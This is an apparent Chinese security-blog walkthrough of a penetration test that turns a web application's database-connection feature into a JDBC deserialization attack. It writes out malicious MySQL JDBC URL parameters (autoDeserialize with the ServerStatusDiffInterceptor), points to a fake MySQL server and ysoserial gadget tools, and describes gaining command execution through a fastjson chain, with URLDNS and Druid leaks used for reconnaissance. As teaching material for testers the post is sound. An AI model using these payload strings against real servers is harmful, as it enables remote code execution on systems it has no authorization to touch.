#  一次JDBC反序列化漏洞   
 听风安全   2025-02-27 05:23  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/Tp9VOk1IaycpsK4AXvozeaMLYk7OBLQau8mDrsWslNiajkybyodE8HbkJ9ibPO7IofWw3S4sE38LyCWYSxSZMjkQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**免责声明**  
  
由于传播、利用本公众号听风安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号听风安全及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
公众号现在只对常读和星标的公众号才展示大图推送，  
  
建议大家把  
听风安全  
  
设为**星标**  
，否则可能就看不到啦！  
  
----------------------------------------------------------------------  
  
在一次测试中遇到了数据库连接功能，这种功能点一般会存在jdbc反序列化漏洞。  
  
特征点：  
  
这种数据库连接点一般会存在jdbc反序列化漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRImMNCIOvuN6toPOus15qZcKgicIdPB82jSCtDkJf9nBM9zS51xnkLLWA/640?wx_fmt=png&from=appmsg "")  
  
  
打法：  
  
先试试打h2不出网利用链。该利用链需要对方服务器导入了h2依赖包才能打。执行ping dnslog命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRICkoTDFUUg0wzvgGicLQEh7xXWs2qwD4cAicIGeKYxbAvza6REwyQGQFw/640?wx_fmt=png&from=appmsg "")  
  
然后测试连接，发送请求，看起来并没有收到dnslog请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRI2kvjykt1snpHe4ahPv74x72sZaFk6e3C0PSRibBUyGiaichjBFZta6Ggw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIcdj2u45M3M5rLbecDhVS3aBnhzCCD7h9lpG8JUE6TJiaphAPlyFQnPw/640?wx_fmt=png&from=appmsg "")  
  
  
那就换着打常规的出网利用链。需要用到这个工具。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIpfxaePTbtSs7Gl6CenZJSztwIH0OeAgJUzuE8hMeCGs9Ficp4hrMwvg/640?wx_fmt=png&from=appmsg "")  
  
下载地址：https://github.com/4ra1n/mysql-fake-server/  
  
打个dnslog链，探测是否存在反序列化漏洞。  
  
  
先在自己的vps起一个服务  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRItiaQ7xgZJ4Pjs127z0Z3bl3JVxVl059mcBQ6pRhoqGra97sCErb6wsw/640?wx_fmt=png&from=appmsg "")  
  
在url处写入(目标服务器JDBC Version6.x时使用)  
  
jdbc:mysql://ip:port/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor  
  
（目标服务器JDBC Version8.x时使用)  
  
jdbc:mysql://ip:port/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor  
  
  
用户名处写入要打的urldns地址，密码可以随便写  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRI5vRpYsFqyIzViahbGMkxzApabUHf8mZdtXFEUZiaOkZqeu9HMjsZ2yUQ/640?wx_fmt=png&from=appmsg "")  
  
VPS成功收到请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIybrzZYWfxZl5oJtXnHLOzF4hgRO8gqt6wSt2oiaN651eLia6lQ8Ze1KA/640?wx_fmt=png&from=appmsg "")  
  
dnslog收到回显  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRI8Yv1Uc94icicNltU9E8OLuua2GTejf6lIw8mVLEzLpJLLu6YaJA13xpA/640?wx_fmt=png&from=appmsg "")  
  
接下来可以试试打可以执行命令的链，例如cc链，cb链等。  
  
但是试了几个下来都没有成功执行命令，就是说目标服务器可能没有导入对应的依赖。（过程省略）  
  
  
刚好bp插件帮我扫到了druid未授权漏洞，可以通过druid未授权看看服务器里的组件有什么，就可以判断打什么链了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIWNQtd992s7gMHGZq1bA9YgBd7khPMCftFBOklib04Pj1axNUU6jgw6g/640?wx_fmt=png&from=appmsg "")  
  
  
服务器导入的是commons-collections-3.2.2.jar版本，相较于之前的版本增加了一个安全检查，所以没办法直接打cc链。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIOWubux9cVJrTJiaDKzV5wsG7zCAyJMBBlXUMibBBpEEJDvPb4KsbxARg/640?wx_fmt=png&from=appmsg "")  
  
目标服务器还有c3p0，但是这个链不太好打jdbc反序列化，需要的前置条件比较多。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIUa21oTY519LXLk3y2c4zpPibibcrxKDuJKgD0KA43B2Oh1AOj9lZUWgg/640?wx_fmt=png&from=appmsg "")  
  
又发现了目标服务器使用了fastjson，看来可以直接打fastjson链了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIz03uUSIdsffJjcxednO7zHzp3cacZliadTsbng47p2yViaI4qqjQdD4g/640?wx_fmt=png&from=appmsg "")  
  
  
使用工具生成fastjson链，执行ping命令  
  
https://github.com/Lotus6/ysoserial  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIiaicQd4x9MZW5vO4BSMeMjOYDrbxF8SHrBEIExMgdD6ficmFaT8yWIxibA/640?wx_fmt=png&from=appmsg "")  
  
  
将base64编码的payload在vps上，这里我放到了test文件里  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIV1MW1kTtPsicTp04W180ysZrB7jqUxrZYYUnYicczcFWcdw1npRL7fvQ/640?wx_fmt=png&from=appmsg "")  
  
  
通过命令再次启动服务  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIwJjpB4GgSSY1PlW7WsiaqFxNEicjQaIqcgYMrSq8twAKFoWZ4tE0qleQ/640?wx_fmt=png&from=appmsg "")  
  
再次创建数据库连接，将用户名处改为deser_CUSTOM  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIYrcyLufCxDZXX5cdicj8qDzJKREz8RK0DVsPYj3HUeco0Q9NFwbafHg/640?wx_fmt=png&from=appmsg "")  
  
  
成功执行ping命令，拿下。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIcwrGsmEwrQzyDLKwnF1VgIpNweljLvPRkic9XRiaDd4wPdr8hvV7Q2MA/640?wx_fmt=png&from=appmsg "")  
  
  
补充：  
  
如果目标没有druid未授权，那么怎么知道目标服务器有什么链可以打呢？  
  
可以通过urldns链判断目标有什么利用链，如果存在某个指定的类，就进行dnslog请求，从而判断服务器有什么链，具体原理这里不细讲，有兴趣的可以看这个文章了解。  
  
https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA  
  
我们可以用珂师傅的工具  
  
https://github.com/kezibei/Urldns  
  
通过该工具生成base64编码的payload  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIXZblBKUWUAoTk6s3aojk6icHDeJibAzYTF6IEyffafwybTic9WWsEYUYQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIw1twj4hgTO7lho4iaQvYU7OZ9s2oHJ7mrCb9o9zMx3UqpCLia9j42cKA/640?wx_fmt=png&from=appmsg "")  
  
和刚才的步骤相同，放到vps上面，过程省略。成功把目标服务器信息回显出来。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fp1zrrz1Uib9fpI9mbf7VKGpOT9icBvYRIsFaEDIAqtEaibPCfv6ZicibHq0PpGTic6QQuduibAF7fuUz9lwa6FE5mPBw/640?wx_fmt=png&from=appmsg "")  
  
不可错过的往期推荐哦  
  
  
```
```  
  
  
点击下方名片，关注我们  
  
  
  
觉得内容不错，就点下  
“**赞**  
”  
和  
“**在看**  
”  
  
  
如果不想错过新的内容推送可以设为**星标**  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Yv6ic9zgr5hTYyCkc91euAiaGULJSbiaHricFHs2dd2sib20WTJKwHYD90Jia9HCKxnmJUwnkicGU7rVP3EYCVh3dMnng/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
  
